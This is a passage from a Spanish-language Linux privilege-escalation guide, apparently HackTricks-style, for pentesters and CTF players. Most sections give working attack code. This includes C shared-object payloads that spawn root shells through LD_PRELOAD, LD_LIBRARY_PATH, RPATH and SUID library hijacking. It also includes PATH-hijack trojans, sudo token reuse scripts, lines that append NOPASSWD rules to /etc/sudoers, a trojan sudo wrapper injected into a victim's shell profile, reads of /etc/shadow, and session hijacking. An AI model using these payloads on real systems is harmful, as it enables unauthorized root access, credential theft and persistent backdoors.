Las variables de Terraform se pueden proporcionar mediante variables de entorno `TF_VAR_<name>` si la regla específica de sudo las conserva. Una **lectura** a través de un symlink de origen también requiere un provider que siga el enlace y copie el resultado protegido a un destino legible por quien invoca el proceso. Por separado, una **escritura** a través de un symlink de destino requiere una entrada de destino controlada por quien invoca el proceso y un provider privilegiado que siga el enlace al escribir; un job programado posterior es solo una de las posibles consecuencias. Antes de probar cualquiera de las dos vías, inspecciona la concesión exacta de sudo, los archivos `.tf` relevantes, la configuración de CLI seleccionada y la propiedad de las rutas mediante comandos de solo lectura como `sudo -l`, `stat` y `readlink`. Las validaciones léxicas débiles como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` no resuelven symlinks:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform resuelve el symlink y copia el `/root/root.txt` real en un destino legible por el atacante. El mismo enfoque puede usarse para **escribir** en rutas privilegiadas creando previamente symlinks en el destino (p. ej., apuntando la ruta de destino del provider dentro de `/etc/cron.d/`).

### requiretty / !requiretty

En algunas distribuciones antiguas, sudo puede configurarse con `requiretty`, lo que obliga a que sudo se ejecute únicamente desde un TTY interactivo. Si se establece `!requiretty` (o la opción está ausente), sudo puede ejecutarse desde contextos no interactivos, como reverse shells, trabajos cron o scripts.

```bash
Defaults !requiretty
```

Esto no es una vulnerabilidad directa por sí sola, pero amplía las situaciones en las que se pueden abusar las reglas de sudo sin necesitar una PTY completa.

### Sudo env_keep+=PATH / secure_path inseguro → secuestro de PATH

Si `sudo -l` muestra `env_keep+=PATH` o un `secure_path` que contiene entradas modificables por un atacante (p. ej., `/home/<user>/bin`), se puede suplantar un comando externo sin ruta explícita dentro del destino permitido por sudo.<sup>[[3]](#references)</sup> También conviene revisar la ausencia de un `secure_path` efectivo **si** el entorno de sudo del comando conserva un `PATH` controlado por quien lo invoca; la ausencia por sí sola no demuestra que así sea. Lee el script permitido sin ejecutarlo y, después, verifica la regla exacta de RunAs y argumentos, la ruta de búsqueda efectiva de comandos y la existencia de un directorio modificable y transitable anterior que contenga el nombre del comando. La autenticación, `NOEXEC`, los builtins del shell y las rutas absolutas a comandos pueden cambiar el resultado.

- Requisitos: una regla de sudo (a menudo `NOPASSWD`) que ejecute un script/binario que invoque comandos sin rutas absolutas (`free`, `df`, `ps`, etc.) y una entrada de PATH modificable que se busque primero.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Evasión de rutas en la ejecución de sudo
**Salta** para leer otros archivos o usa **symlinks**. Por ejemplo, en el archivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Si se utiliza un **wildcard** (\*), es aún más fácil:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando sudo/binario SUID sin ruta del comando

Si se concede el **permiso de sudo** para un único comando **sin especificar la ruta**: _hacker10 ALL= (root) less_, puedes explotarlo cambiando la variable PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Esta técnica también se puede usar si un binario **suid** **ejecuta otro comando sin especificar su ruta (comprueba siempre con** _**strings**_ **el contenido de un binario SUID sospechoso)**.

[Ejemplos de payloads para ejecutar.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binario SUID con ruta al comando

Si el binario **suid** **ejecuta otro comando especificando la ruta**, puedes intentar **exportar una función** con el nombre del comando que llama el archivo suid.

Por ejemplo, si un binario suid llama a _**/usr/sbin/service apache2 start**_, tienes que intentar crear y exportar la función:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Entonces, cuando ejecutes el binario SUID, se ejecutará esta función

### Wrappers de copia SUID personalizados

Una utilidad SUID propiedad de root que acepta rutas de origen y destino puede cruzar dos límites de confianza distintos. Si construye un comando de shell a partir de cualquiera de los argumentos (por ejemplo, pasando un comando `cp` construido a `system()`), los metacaracteres del shell podrían ejecutar otro comando con sus privilegios efectivos. Aunque invoque `cp` de forma segura, sin usar un shell, un destino sin restricciones puede permitir escrituras privilegiadas arbitrarias en archivos como `/etc/passwd`. Revisa el manejo de los argumentos del wrapper, el comportamiento del UID efectivo, las restricciones del destino y si el archivo copiado conserva el contenido controlado por el usuario que ejecuta el programa; un error genérico de `cp` o el bit SUID, por sí solos, no prueban que se dé ninguna de estas situaciones. Enumera el binario y sus permisos de forma pasiva antes de realizar cualquier prueba manual.

### Script modificable ejecutado por un wrapper SUID

Una configuración incorrecta común en aplicaciones personalizadas es un wrapper binario SUID propiedad de root que ejecuta un script, mientras que el propio script puede ser modificado por usuarios sin privilegios.

Patrón típico:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Si `/usr/local/bin/backup.sh` tiene permisos de escritura, puedes añadir comandos de payload y luego ejecutar el wrapper SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Comprobaciones rápidas:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Esta ruta de ataque es especialmente común en wrappers de «mantenimiento»/«backup» incluidos en `/usr/local/bin`.

### LD_PRELOAD y **LD_LIBRARY_PATH**

La variable de entorno **LD_PRELOAD** se utiliza para especificar una o más bibliotecas compartidas (archivos .so) que el cargador debe cargar antes que todas las demás, incluida la biblioteca estándar de C (`libc.so`). Este proceso se conoce como precarga de una biblioteca.

Sin embargo, para mantener la seguridad del sistema y evitar que se explote esta función, especialmente con ejecutables **suid/sgid**, el sistema aplica ciertas condiciones:

- El cargador ignora **LD_PRELOAD** en los ejecutables cuyo ID de usuario real (_ruid_) no coincide con el ID de usuario efectivo (_euid_).
- En los ejecutables con suid/sgid, solo se precargan las bibliotecas que están en rutas estándar y que también tienen suid/sgid.

Puede producirse una escalada de privilegios si tienes la capacidad de ejecutar comandos con `sudo` y la salida de `sudo -l` incluye la instrucción **env_keep+=LD_PRELOAD**. Esta configuración permite que la variable de entorno **LD_PRELOAD** persista y se reconozca incluso al ejecutar comandos con `sudo`, lo que puede llevar a la ejecución de código arbitrario con privilegios elevados.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Guardar como **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Después **compílalo** usando:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Finalmente, **escalar privilegios** ejecutando

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Se puede abusar de una escalada de privilegios similar si el atacante controla la variable de entorno **LD_LIBRARY_PATH**, ya que controla la ruta donde se buscarán las bibliotecas.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### Binario SUID: inyección de .so

Al encontrar un binario con permisos **SUID** que parezca inusual, es recomendable comprobar si carga correctamente los archivos **.so**. Esto se puede verificar ejecutando el siguiente comando:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Por ejemplo, encontrar un error como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugiere una posible vía de explotación.

Para explotarlo, se crearía un archivo C, por ejemplo _"/path/to/.config/libcalc.c"_, que contenga el siguiente código:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Este código, una vez compilado y ejecutado, tiene como objetivo elevar privilegios manipulando los permisos de archivos y ejecutando un shell con privilegios elevados.

Compila el archivo C anterior en un archivo de objeto compartido (.so) con:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Finalmente, ejecutar el binario SUID afectado debería activar el exploit, lo que podría comprometer el sistema.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Ahora que hemos encontrado un binario SUID que carga una biblioteca desde una carpeta en la que podemos escribir, creemos la biblioteca en esa carpeta con el nombre necesario:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Si obtienes un error como

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

eso significa que la biblioteca que has generado debe tener una función llamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) es una lista seleccionada de binarios de Unix que un atacante puede aprovechar para eludir las restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo, pero para los casos en los que **solo puedes inyectar argumentos** en un comando.

El proyecto recopila funciones legítimas de los binarios de Unix que pueden aprovecharse para escapar de shells restringidas, escalar o mantener privilegios elevados, transferir archivos, generar bind y reverse shells, y facilitar otras tareas de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si puedes acceder a `sudo -l`, puedes usar la herramienta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para comprobar si encuentra cómo explotar alguna regla de sudo.

### Reutilización de tokens de sudo

En los casos en los que tienes **acceso a sudo** pero no la contraseña, puedes escalar privilegios **esperando a que se ejecute un comando sudo y luego secuestrando el token de sesión**.<sup>[[18]](#references)</sup>

Requisitos para escalar privilegios:

- Ya tienes una shell como el usuario "_sampleuser_"
- "_sampleuser_" ha **usado `sudo`** para ejecutar algo en los **últimos 15 minutos** (por defecto, esa es la duración del token de sudo, que nos permite usar `sudo` sin introducir ninguna contraseña)
- `cat /proc/sys/kernel/yama/ptrace_scope` devuelve 0
- `gdb` está disponible (puedes subirlo)

(Puedes habilitar temporalmente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificar permanentemente `/etc/sysctl.d/10-ptrace.conf` y establecer `kernel.yama.ptrace_scope = 0`)

Si se cumplen todos estos requisitos, **puedes escalar privilegios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- El **primer exploit** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes usarlo para **activar el token de sudo en tu sesión** (no obtendrás automáticamente una shell de root; ejecuta `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- El **segundo exploit** (`exploit_v2.sh`) creará un shell de sh en _/tmp_ **propiedad de root y con setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- El **tercer exploit** (`exploit_v3.sh`) **creará un archivo sudoers** que hará que los **tokens de sudo sean eternos y permitirá que todos los usuarios usen sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Si tienes **permisos de escritura** en la carpeta o en cualquiera de los archivos creados dentro de ella, puedes usar el binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **crear un token sudo para un usuario y un PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes una shell como ese usuario con PID 1234, puedes **obtener privilegios sudo** sin necesidad de conocer la contraseña ejecutando:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. **De forma predeterminada, estos archivos solo pueden ser leídos por el usuario root y el grupo root**.\
**Si** puedes **leer** este archivo, podrías **obtener información interesante**, y si puedes **escribir** en cualquier archivo, podrás **escalar privilegios**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Si puedes escribir, puedes abusar de este permiso.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Otra forma de abusar de estos permisos:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Existen algunas alternativas al binario `sudo`, como `doas` para OpenBSD. Recuerda revisar su configuración en `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Si `doas` permite usar un editor o intérprete, comprueba las técnicas de escape al estilo GTFOBins:

```bash
doas vim
:!/bin/sh
```

Una regla de `doas` con privilegios de root para el `dstat` original, basado en Python, también justifica revisar la ruta de plugins. Su [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) y su [código fuente](https://github.com/dstat-real/dstat/blob/master/dstat) incluyen `/usr/share/dstat/` y `/usr/local/share/dstat/` entre las ubicaciones de los plugins `dstat_*.py`. Si el usuario actual puede escribir en una ubicación que realmente use la versión instalada y buscar en ella, un plugin seleccionado podría ejecutarse con la identidad RunAs de `doas`. Confirma la regla efectiva, la búsqueda de plugins en esa versión, los permisos o ACL del directorio y de sus directorios padre, y si quien invoca puede seleccionar un plugin; una regla de `dstat` o un directorio escribible por sí solos son solo indicios. Otras implementaciones de `dstat` pueden usar sistemas de plugins distintos. Inspecciona los metadatos de forma pasiva, sin cargar ningún plugin.

### Sudo Hijacking

Si sabes que un **usuario suele conectarse a una máquina y usar `sudo`** para escalar privilegios y has conseguido una shell en el contexto de ese usuario, puedes **crear un nuevo ejecutable de sudo** que ejecute tu código como root y, después, el comando del usuario. Luego, **modifica el $PATH** del contexto del usuario (por ejemplo, añadiendo la nueva ruta a `.bash_profile`) para que, cuando el usuario ejecute sudo, se ejecute tu ejecutable de sudo.

Ten en cuenta que, si el usuario usa un shell distinto de bash, tendrás que modificar otros archivos para añadir la nueva ruta. Por ejemplo, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc` y `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

O ejecutando algo como:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Biblioteca compartida

### ld.so

El archivo `/etc/ld.so.conf` indica **de dónde provienen los archivos de configuración cargados**. Normalmente, este archivo contiene la siguiente ruta: `include /etc/ld.so.conf.d/*.conf`

Esto significa que se leerán los archivos de configuración de `/etc/ld.so.conf.d/*.conf`. Estos archivos de configuración **apuntan a otras carpetas** donde se **buscarán** las **bibliotecas**. Por ejemplo, el contenido de `/etc/ld.so.conf.d/libc.conf` es `/usr/local/lib`. **Esto significa que el sistema buscará bibliotecas dentro de `/usr/local/lib`**.

Si por algún motivo **un usuario tiene permisos de escritura** en cualquiera de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta dentro del archivo de configuración en `/etc/ld.so.conf.d/*.conf`, podría ser capaz de escalar privilegios.\
Echa un vistazo a **cómo explotar esta configuración incorrecta** en la siguiente página:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Al copiar la biblioteca en `/var/tmp/flag15/`, el programa la usará desde esta ubicación, tal como se especifica en la variable `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Luego crea una biblioteca maliciosa en `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capacidades

Las capabilities de Linux proporcionan **un subconjunto de los privilegios root disponibles para un proceso**. Esto divide efectivamente los **privilegios root en unidades más pequeñas y diferenciadas**. Cada una de estas unidades se puede otorgar a los procesos de forma independiente. De esta manera, se reduce el conjunto completo de privilegios, disminuyendo los riesgos de explotación.\
Lee la siguiente página para **obtener más información sobre las capabilities y cómo abusar de ellas**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Permisos de directorio

En un directorio, el **bit de «ejecución»** implica que el usuario afectado puede hacer «**cd**» al directorio.\
El bit de **«lectura»** implica que el usuario puede **listar** los **archivos**, y el bit de **«escritura»** implica que puede **eliminar** y **crear** nuevos **archivos**.

## ACLs

Las Listas de control de acceso (ACLs) representan la capa secundaria de permisos discrecionales, capaz de **anular los permisos tradicionales ugo/rwx**. Estos permisos mejoran el control del acceso a archivos o directorios al permitir o denegar derechos a usuarios específicos que no son los propietarios ni forman parte del grupo. Este nivel de **granularidad garantiza una gestión de acceso más precisa**. Encontrarás más detalles [**aquí**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Otorga** al usuario «kali» permisos de lectura y escritura sobre un archivo:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Obtener** archivos con ACL específicas del sistema:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Backdoor ACL oculto en archivos adicionales de sudoers

Una configuración incorrecta común es un archivo propiedad de root en `/etc/sudoers.d/` con permisos `440` que, aun así, concede acceso de escritura a un usuario con pocos privilegios mediante ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Si ves algo como `user:alice:rw-`, el usuario puede añadir una regla de sudo a pesar de los bits de modo restrictivos:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Esta es una ruta de persistencia/privesc de alto impacto basada en ACL, porque es fácil pasarla por alto en revisiones que solo usan `ls -l`.

## Sesiones de shell abiertas

El acceso entre usuarios a GNU Screen depende de la **configuración y la ACL de la sesión en ejecución**, no solo de su versión. [La documentación de GNU Screen indica](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) que debe compilarse con soporte multiusuario; `multiuser on` y un permiso `acladd` o `aclchg` adecuado permiten que otro usuario se conecte. [El manual también requiere setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) para la búsqueda de sesiones entre usuarios. Un socket visible propiedad de root o un binario `screen` SUID, por sí solos, no demuestran que haya una shell de root a la que se pueda conectar. Confirma que la sesión activa sea multiusuario, que el usuario actual tenga permisos efectivos de entrada/comandos y que la shell de esa sesión se ejecute como el propietario privilegiado antes de considerarlo una escalada.

### screen sessions hijacking

**Listar sesiones de screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![secuestro de sesiones de screen: ubicaciones de los sockets (algunos sistemas exponen uno como enlace simbólico del otro): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Conectarse a una sesión**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## Hijacking de sesiones de tmux

Esto era un problema de las **versiones antiguas de tmux**. No pude hacer hijacking de una sesión de tmux (v2.1) creada por root desde un usuario sin privilegios.

**Listar sesiones de tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Ubicaciones de los sockets (algunos sistemas exponen uno como symlink del otro): secuestro de sesiones de tmux: tmux -S /tmp/dev sess ls Lista las sesiones que usan ese socket; puedes iniciar una sesión de tmux en ese socket...](<../../images/image (837).png>)

**Conectarse a una sesión**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Comprueba **la máquina Valentine de HTB** como ejemplo.

## SSH

### PRNG predecible de OpenSSL en Debian - CVE-2008-0166

Las claves generadas con versiones afectadas de OpenSSL de Debian o sus derivadas durante el período histórico vulnerable pueden tener una aleatoriedad predecible; la distribución actual del host o una versión parcheada de OpenSSL no permiten determinar cómo se generó una clave antigua. Comprueba la **clave específica** con una lista de bloqueo histórica adecuada y verifica su procedencia. El [manual de `ssh-vulnkey` de Debian](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) describe cómo comprobar claves públicas y `authorized_keys`, y [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) registra la corrección de OpenSSL. Una entrada en el archivo `authorized_keys` de una cuenta privilegiada solo es una pista para escalar privilegios si se puede recuperar la clave privada correspondiente y la política SSH efectiva sigue aceptando esa clave para esa cuenta; una clave de **host** débil no es, por sí sola, una credencial de inicio de sesión. Sustituye las claves comprometidas y elimina sus autorizaciones antiguas.

### Valores de configuración SSH de interés

- **PasswordAuthentication:** Especifica si se permite la autenticación con contraseña. El valor predeterminado de OpenSSH upstream es `yes`; la configuración de la distribución puede sobrescribirlo.
- **PubkeyAuthentication:** Especifica si se permite la autenticación con clave pública. El valor predeterminado es `yes`.
- **PermitEmptyPasswords**: Cuando se permite la autenticación con contraseña, especifica si el servidor permite iniciar sesión en cuentas con contraseñas vacías. El valor predeterminado es `no`.

### Archivos de control de inicio de sesión

Estos archivos influyen en quién puede iniciar sesión y cómo:

- **`/etc/nologin`**: si existe, bloquea los inicios de sesión de usuarios que no sean root y muestra su mensaje.
- **`/etc/securetty`**: restringe desde dónde puede iniciar sesión root (lista de TTY permitidas).
- **`/etc/motd`**: banner posterior al inicio de sesión (puede filtrar información del entorno o detalles de mantenimiento).

### PermitRootLogin

Especifica si root puede iniciar sesión mediante SSH. El valor predeterminado de OpenSSH upstream es `prohibit-password`; la configuración de la distribución puede sobrescribirlo. Valores posibles:

- `yes`: root puede iniciar sesión con contraseña y clave privada
- `without-password` o `prohibit-password`: root solo puede iniciar sesión con una clave privada
- `forced-commands-only`: root solo puede iniciar sesión con una clave privada y si se especifican las opciones de comandos
- `no` : no

### Autoridades de certificación SSH de usuario de confianza

`TrustedUserCAKeys` indica las claves públicas en las que confía sshd para firmar certificados de **usuario**. Si un usuario con menos privilegios puede leer la clave CA privada correspondiente, revisa quién puede obtener un certificado y con qué principales de cuenta podría autenticarse. `AuthorizedPrincipalsFile` o `AuthorizedPrincipalsCommand` pueden restringir los nombres aceptados; si no se configura ninguno, el certificado debe incluir el nombre de la cuenta de destino. `PermitRootLogin prohibit-password` bloquea la autenticación de root con contraseña, pero puede permitir la autenticación mediante certificado. La exposición de una ruta a una clave por sí sola no demuestra que se pueda acceder: confirma el par de claves pública y privada, las reglas `Match` efectivas, la política de la cuenta, la frase de contraseña de la clave, la revocación y los algoritmos de firma aceptados. No incluyas bytes de claves privadas en la salida de enumeración. Consulta el [manual de configuración del servidor OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

También se puede usar una clave CA privada **sin que el usuario actual pueda leerla** si una regla de delegación de privilegios permite que ese usuario invoque un [firmante de certificados sin restricciones, como `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), con la identidad del propietario de la clave. Relaciona el comando y los argumentos exactos permitidos con el acceso a la clave por parte de la cuenta que firma, la CA pública de confianza según la configuración efectiva de sshd, el principal aceptado para la cuenta de destino, la validez del certificado y la política de inicio de sesión de esa cuenta. Un comando delegado de firma o un archivo de CA de confianza por sí solos no demuestran que se pueda acceder a otra cuenta; no firmes un certificado de prueba durante la enumeración pasiva.

Para la ruta de confianza de CA separada y específica de cada cuenta, consulta [Confusión del delimitador de principales en certificados SSH](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Especifica los archivos que contienen las claves públicas que se pueden usar para la autenticación de usuarios. Puede contener tokens como `%h`, que se sustituirán por el directorio personal. **Se pueden indicar rutas absolutas** (que comienzan por `/`) o **rutas relativas al directorio personal del usuario**. Por ejemplo:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Esa configuración indicará que, si intentas hacer login con la clave **private** del usuario "**testusername**", ssh comparará la clave pública de tu clave con las que se encuentran en `/home/testusername/.ssh/authorized_keys` y `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

El SSH agent forwarding te permite **usar tus claves SSH locales en lugar de dejar claves** (¡sin passphrases!) en tu servidor. Así, podrás **conectarte** por ssh **a un host** y, desde allí, **conectarte a otro** host **usando** la **clave** ubicada en tu **host inicial**.

Debes establecer esta opción en `$HOME/.ssh.config` así:

```
Host example.com
  ForwardAgent yes
```

Ten en cuenta que, si `Host` es `*`, cada vez que el usuario se conecta a otra máquina, esa máquina podrá acceder a las claves (lo que supone un problema de seguridad).

El archivo `/etc/ssh_config` puede **anular** estas **opciones** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **permitir** o **denegar** el reenvío de ssh-agent con la palabra clave `AllowAgentForwarding` (el valor predeterminado es permitirlo).

Si descubres que el reenvío de Agent está configurado en un entorno, lee la página siguiente, ya que **quizá puedas abusar de él para escalar privilegios**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Archivos interesantes

### Archivos de perfiles

El archivo `/etc/profile` y los archivos de `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario abre un shell nuevo**. Por lo tanto, si puedes **escribir o modificar cualquiera de ellos, puedes escalar privilegios**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Si encuentras algún script de perfil extraño, deberías revisarlo en busca de **datos confidenciales**.

### Archivos Passwd/Shadow

Según el sistema operativo, los archivos `/etc/passwd` y `/etc/shadow` podrían tener otro nombre o podría haber una copia de seguridad. Por lo tanto, se recomienda **encontrarlos todos** y **comprobar si puedes leerlos** para ver **si contienen hashes**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

En algunas ocasiones puedes encontrar **hashes de contraseñas** dentro del archivo `/etc/passwd` (o equivalente)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd escribible

Primero, genera una contraseña con uno de los siguientes comandos.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Luego agrega el usuario `hacker` y añade la contraseña generada.

```
